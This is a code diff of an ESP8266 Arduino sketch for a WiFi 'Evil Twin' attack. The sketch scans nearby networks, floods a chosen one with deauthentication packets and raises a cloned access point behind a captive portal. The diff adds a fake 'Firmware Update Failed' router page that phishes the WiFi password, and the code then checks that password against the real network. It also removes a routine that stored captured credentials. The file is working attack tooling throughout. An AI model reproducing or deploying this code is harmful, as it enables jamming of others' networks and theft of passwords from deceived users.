@@ -2,18 +2,20 @@
 #include <ESP8266WiFi.h>
 #include <DNSServer.h>
 #include <ESP8266WebServer.h>
-#include <EEPROM.h>
-#include <ArduinoJson.h>
+#include <ESP8266HTTPClient.h>
 
 extern "C" {
 #include "user_interface.h"
 }
 
-typedef struct {
+
+typedef struct
+{
   String ssid;
   uint8_t ch;
   uint8_t bssid[6];
-} _Network;
+}  _Network;
+
 
 const byte DNS_PORT = 53;
 IPAddress apIP(192, 168, 1, 1);
@@ -23,96 +25,67 @@ ESP8266WebServer webServer(80);
 _Network _networks[16];
 _Network _selectedNetwork;
 
-bool hotspot_active = false;
-bool deauthing_active = false;
-String _correct = "";
-String _tryPassword = "";
-
-// Khai báo và khởi tạo biến _tempHTML
-String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
-                   "<style> .content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
-                   "</head><body><div class='content'>"
-                   "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
-                   "<button style='display:inline-block;'{disabled}>{deauth_button}</button></form>"
-                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
-                   "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
-                   "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";
-
 void clearArray() {
   for (int i = 0; i < 16; i++) {
     _Network _network;
     _networks[i] = _network;
   }
+
 }
 
-void saveCredentials(String ssid, String password) {
-  EEPROM.begin(512);
-  StaticJsonDocument<200> doc;
-  doc["ssid"] = ssid;
-  doc["password"] = password;
-  String json;
-  serializeJson(doc, json);
+String _correct = "";
+String _tryPassword = "";
 
-  for (int i = 0; i < json.length(); i++) {
-    EEPROM.write(i, json[i]);
-  }
-  EEPROM.commit();
-  EEPROM.end();
-}
+// Default main strings
+#define SUBTITLE "ACCESS POINT RESCUE MODE"
+#define TITLE "<warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</warning> Firmware Update Failed"
+#define BODY "Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert the old firmware and manually update later, please verify your password."
 
 String header(String t) {
   String a = String(_selectedNetwork.ssid);
-  String CSS = "body { font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f4f4f9; }"
-               "header { background: #007bff; color: #fff; padding: 10px 0; text-align: center; }"
-               "h1 { margin: 0; }"
-               "div.content { padding: 20px; }"
-               "form { max-width: 600px; margin: 0 auto; background: #fff; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); }"
-               "label { display: block; margin-bottom: 10px; color: #333; }"
-               "input[type='password'] { width: calc(100% - 22px); padding: 10px; margin-bottom: 20px; border-radius: 5px; border: 1px solid #ccc; }"
-               "input[type='submit'], button { background: #007bff; color: #fff; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; transition: background 0.3s ease; }"
-               "input[type='submit']:hover, button:hover { background: #0056b3; }"
-               "table { width: 100%; border-collapse: collapse; margin-top: 20px; }"
-               "th, td { padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }"
-               "tr:nth-child(even) { background: #f9f9f9; }";
-               
+  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
+               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
+               "div { padding: 0.5em; }"
+               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw;}"
+               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
+               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
+               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
+               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
+               "textarea { width: 100%; }"
+               ;
   String h = "<!DOCTYPE html><html>"
-             "<head><title>" + a + " :: " + t + "</title>"
-             "<meta name='viewport' content='width=device-width, initial-scale=1'>"
+             "<head><title><center>" + a + " :: " + t + "</center></title>"
+             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
              "<style>" + CSS + "</style>"
-             "<meta charset='UTF-8'></head>"
-             "<body><header><h1>" + t + "</h1></header><div class='content'>";
+             "<meta charset=\"UTF-8\"></head>"
+             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
   return h;
 }
 
 String footer() {
-  return "</div><footer style='text-align:center; padding:10px 0; background:#007bff; color:#fff;'><p>&#169; All rights reserved.</p></footer></body></html>";
+  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
 }
 
 String index() {
-  return header("WiFi Credentials") +
-         "<form action='/' method='post'><label for='password'>WiFi password:</label>" +
-         "<input type='password' id='password' name='password' minlength='8' required>" +
-         "<input type='submit' value='Continue'>" +
-         "<button type='button' onclick=\"location.href='/view-passwords'\">View Passwords</button></form>" +
-         footer();
+  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' method=post><label>WiFi password:</label>" +
+         "<input type=password id='password' name='password' minlength='8'></input><input type=submit value=Continue></form>" + footer();
 }
 
 void setup() {
+
   Serial.begin(115200);
   WiFi.mode(WIFI_AP_STA);
   wifi_promiscuous_enable(1);
-  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
+  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
   WiFi.softAP("Quốc Tài", "deauther");
   dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
 
   webServer.on("/", handleIndex);
   webServer.on("/result", handleResult);
   webServer.on("/admin", handleAdmin);
-  webServer.on("/view-passwords", handleViewPasswords);
   webServer.onNotFound(handleIndex);
   webServer.begin();
 }
-
 void performScan() {
   int n = WiFi.scanNetworks();
   clearArray();
@@ -130,16 +103,8 @@ void performScan() {
   }
 }
 
-void handleViewPasswords() {
-  EEPROM.begin(512);
-  String json;
-  for (int i = 0; i < 512; i++) {
-    json += char(EEPROM.read(i));
-  }
-  EEPROM.end();
-
-  webServer.send(200, "application/json", json);
-}
+bool hotspot_active = false;
+bool deauthing_active = false;
 
 void handleResult() {
   String html = "";
@@ -151,23 +116,33 @@ void handleResult() {
     Serial.println("Wrong password tried!");
   } else {
     _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
-    saveCredentials(_selectedNetwork.ssid, _tryPassword);
     hotspot_active = false;
     dnsServer.stop();
-    int n = WiFi.softAPdisconnect(true);
+    int n = WiFi.softAPdisconnect (true);
     Serial.println(String(n));
-    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-    WiFi.softAP("WiPhi_34732", "d347h320");
+    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
+    WiFi.softAP("Quốc Tài", "deauther");
     dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
     Serial.println("Good password was entered !");
     Serial.println(_correct);
   }
 }
 
+
+String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
+                   "<style> .content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
+                   "</head><body><div class='content'>"
+                   "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
+                   "<button style='display:inline-block;'{disabled}>{deauth_button}</button></form>"
+                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
+                   "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
+                   "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";
+
 void handleIndex() {
+
   if (webServer.hasArg("ap")) {
     for (int i = 0; i < 16; i++) {
-      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
+      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
         _selectedNetwork = _networks[i];
       }
     }
@@ -184,29 +159,31 @@ void handleIndex() {
   if (webServer.hasArg("hotspot")) {
     if (webServer.arg("hotspot") == "start") {
       hotspot_active = true;
+
       dnsServer.stop();
-      int n = WiFi.softAPdisconnect(true);
+      int n = WiFi.softAPdisconnect (true);
       Serial.println(String(n));
-      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
+      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
       WiFi.softAP(_selectedNetwork.ssid.c_str());
       dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
+
     } else if (webServer.arg("hotspot") == "stop") {
       hotspot_active = false;
       dnsServer.stop();
-      int n = WiFi.softAPdisconnect(true);
+      int n = WiFi.softAPdisconnect (true);
       Serial.println(String(n));
-      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-      WiFi.softAP("Quốc Tài", "deauther");
+      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
+      WiFi.softAP("WiPhi_34732", "d347h320");
       dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
     }
     return;
   }
 
-  if (!hotspot_active) {
+  if (hotspot_active == false) {
     String _html = _tempHTML;
 
     for (int i = 0; i < 16; ++i) {
-      if (_networks[i].ssid == "") {
+      if ( _networks[i].ssid == "") {
         break;
       }
       _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";
@@ -226,6 +203,15 @@ void handleIndex() {
       _html.replace("{deauth}", "start");
     }
 
+    if (hotspot_active) {
+      _html.replace("{hotspot_button}", "Stop EvilTwin");
+      _html.replace("{hotspot}", "stop");
+    } else {
+      _html.replace("{hotspot_button}", "Start EvilTwin");
+      _html.replace("{hotspot}", "start");
+    }
+
+
     if (_selectedNetwork.ssid == "") {
       _html.replace("{disabled}", " disabled");
     } else {
@@ -240,7 +226,9 @@ void handleIndex() {
 
     _html += "</div></body></html>";
     webServer.send(200, "text/html", _html);
+
   } else {
+
     if (webServer.hasArg("password")) {
       _tryPassword = webServer.arg("password");
       if (webServer.arg("deauth") == "start") {
@@ -251,20 +239,22 @@ void handleIndex() {
       WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
       webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><center><h2 style='font-size:7vw'>Verifying integrity, please wait...<br><progress value='10' max='100'>10%</progress></h2></center></body> </html>");
       if (webServer.arg("deauth") == "start") {
-        deauthing_active = true;
+      deauthing_active = true;
       }
     } else {
       webServer.send(200, "text/html", index());
     }
   }
+
 }
 
 void handleAdmin() {
+
   String _html = _tempHTML;
 
   if (webServer.hasArg("ap")) {
     for (int i = 0; i < 16; i++) {
-      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
+      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
         _selectedNetwork = _networks[i];
       }
     }
@@ -281,18 +271,20 @@ void handleAdmin() {
   if (webServer.hasArg("hotspot")) {
     if (webServer.arg("hotspot") == "start") {
       hotspot_active = true;
+
       dnsServer.stop();
-      int n = WiFi.softAPdisconnect(true);
+      int n = WiFi.softAPdisconnect (true);
       Serial.println(String(n));
-      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
+      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
       WiFi.softAP(_selectedNetwork.ssid.c_str());
       dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
+
     } else if (webServer.arg("hotspot") == "stop") {
       hotspot_active = false;
       dnsServer.stop();
-      int n = WiFi.softAPdisconnect(true);
+      int n = WiFi.softAPdisconnect (true);
       Serial.println(String(n));
-      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
+      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
       WiFi.softAP("WiPhi_34732", "d347h320");
       dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
     }
@@ -300,12 +292,12 @@ void handleAdmin() {
   }
 
   for (int i = 0; i < 16; ++i) {
-    if (_networks[i].ssid == "") {
+    if ( _networks[i].ssid == "") {
       break;
     }
-    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";
+    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" +  bytesToStr(_networks[i].bssid, 6) + "'>";
 
-    if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
+    if ( bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
       _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
     } else {
       _html += "<button>Select</button></form></td></tr>";
@@ -328,6 +320,7 @@ void handleAdmin() {
     _html.replace("{hotspot}", "start");
   }
 
+
   if (_selectedNetwork.ssid == "") {
     _html.replace("{disabled}", " disabled");
   } else {
@@ -340,9 +333,10 @@ void handleAdmin() {
 
   _html += "</table></div></body></html>";
   webServer.send(200, "text/html", _html);
+
 }
 
-String bytesToStr(const uint8_t *b, uint32_t size) {
+String bytesToStr(const uint8_t* b, uint32_t size) {
   String str;
   const char ZERO = '0';
   const char DOUBLEPOINT = ':';
@@ -359,7 +353,7 @@ unsigned long now = 0;
 unsigned long wifinow = 0;
 unsigned long deauth_now = 0;
 
-uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
 uint8_t wifi_channel = 1;
 
 void loop() {
@@ -367,6 +361,7 @@ void loop() {
   webServer.handleClient();
 
   if (deauthing_active && millis() - deauth_now >= 1000) {
+
     wifi_set_channel(_selectedNetwork.ch);
 
     uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
@@ -399,4 +394,3 @@ void loop() {
     wifinow = millis();
   }
 }
-        
